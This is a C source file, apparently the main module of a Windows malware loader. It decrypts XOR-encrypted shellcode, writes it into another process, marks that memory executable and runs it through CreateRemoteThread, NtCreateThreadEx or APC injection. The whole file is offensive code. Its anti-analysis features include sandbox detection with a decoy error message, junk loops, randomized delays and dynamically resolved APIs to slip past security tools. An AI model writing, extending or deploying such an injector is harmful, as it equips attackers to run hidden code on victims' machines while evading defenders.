#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "../include/shellcode.h"
#include "../include/dynamic_api.h"
#include "../include/anti_analysis.h"
#include "../include/process_injection.h"
#include "../include/encryption.h"

// Configuration settings
#define USE_XOR_ENCRYPTION 1
#define USE_DYNAMIC_SYSCALLS 1
#define PROCESS_INJECTION_METHOD 2 // 1=CreateRemoteThread, 2=NtCreateThreadEx, 3=QueueUserAPC

extern size_t get_shellcode_size(void);
extern size_t get_xor_key_size(void);

int main() {
    HANDLE processHandle;
    LPVOID remoteBuffer;
    DWORD targetPID;
    DWORD oldProtect;
    API_POINTERS apis;
    ANTI_ANALYSIS aa;
    unsigned char* decrypted_shellcode = NULL;
    unsigned int shellcode_len = get_shellcode_size();
    BOOL success = FALSE;
    
    // Seed random number generator
    srand((unsigned int)time(NULL));
    
    // Memory pollution - anti-analysis
    int counter = 0;
    for (int i = 0; i < ((rand() % 5000) + 5000); i++) {
        counter += i % 7;
    }
    
    // Load anti-analysis functions
    if (!load_anti_analysis_functions(&aa)) {
        return -1;
    }
    
    // Check if we're being analyzed
    if (check_analysis_environment(&aa)) {
        // Do something harmless instead
        MessageBoxA(NULL, "Application cannot start properly.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }
    
    // Load API functions dynamically
    if (!load_dynamic_apis(&apis)) {
        return -1;
    }
    
    // Add randomized delays to evade timing-based detection
    Sleep((rand() % 1000) + 500);
    
    // Decrypt shellcode if it's encrypted
    if (USE_XOR_ENCRYPTION && shellcode_len > 0) {
        decrypted_shellcode = (unsigned char*)malloc(shellcode_len);
        if (decrypted_shellcode == NULL) {
            return -1;
        }
        
        // Copy encrypted shellcode to new buffer
        memcpy(decrypted_shellcode, encrypted_shellcode, shellcode_len);
        
        // Decrypt it
        xor_data(decrypted_shellcode, shellcode_len, xor_key, get_xor_key_size());
    } else {
        decrypted_shellcode = encrypted_shellcode;
    }
    
    // Find target process
    targetPID = find_target_process(&apis);
    if (targetPID == 0) {
        if (USE_XOR_ENCRYPTION && decrypted_shellcode != encrypted_shellcode) {
            free(decrypted_shellcode);
        }
        return -1;
    }

    // Get handle to target process
    processHandle = apis.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (processHandle == NULL) {
        if (USE_XOR_ENCRYPTION && decrypted_shellcode != encrypted_shellcode) {
            free(decrypted_shellcode);
        }
        return -1;
    }

    // Allocate memory in target process
    remoteBuffer = apis.pVirtualAllocEx(
        processHandle, 
        NULL, 
        shellcode_len, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    
    if (remoteBuffer == NULL) {
        apis.pCloseHandle(processHandle);
        if (USE_XOR_ENCRYPTION && decrypted_shellcode != encrypted_shellcode) {
            free(decrypted_shellcode);
        }
        return -1;
    }

    // Write shellcode to target process
    if (!apis.pWriteProcessMemory(
            processHandle, 
            remoteBuffer, 
            decrypted_shellcode, 
            shellcode_len, 
            NULL
        )) {
        apis.pVirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        apis.pCloseHandle(processHandle);
        if (USE_XOR_ENCRYPTION && decrypted_shellcode != encrypted_shellcode) {
            free(decrypted_shellcode);
        }
        return -1;
    }
    
    // Change memory protection to allow execution
    if (!apis.pVirtualProtectEx(
            processHandle, 
            remoteBuffer, 
            shellcode_len, 
            PAGE_EXECUTE_READ, 
            &oldProtect
        )) {
        apis.pVirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        apis.pCloseHandle(processHandle);
        if (USE_XOR_ENCRYPTION && decrypted_shellcode != encrypted_shellcode) {
            free(decrypted_shellcode);
        }
        return -1;
    }
    
    // Execute shellcode using the selected method
    switch (PROCESS_INJECTION_METHOD) {
        case 1:
            success = inject_with_create_remote_thread(processHandle, remoteBuffer, &apis);
            break;
        case 2:
            success = inject_with_nt_create_thread_ex(processHandle, remoteBuffer, &apis);
            break;
        case 3:
            success = inject_with_queue_user_apc(processHandle, remoteBuffer, &apis);
            break;
        default:
            success = inject_with_create_remote_thread(processHandle, remoteBuffer, &apis);
    }
    
    // Cleanup
    if (!success) {
        apis.pVirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    }
    
    apis.pCloseHandle(processHandle);
    
    if (USE_XOR_ENCRYPTION && decrypted_shellcode != encrypted_shellcode) {
        free(decrypted_shellcode);
    }
    
    return (success ? 0 : -1);
} 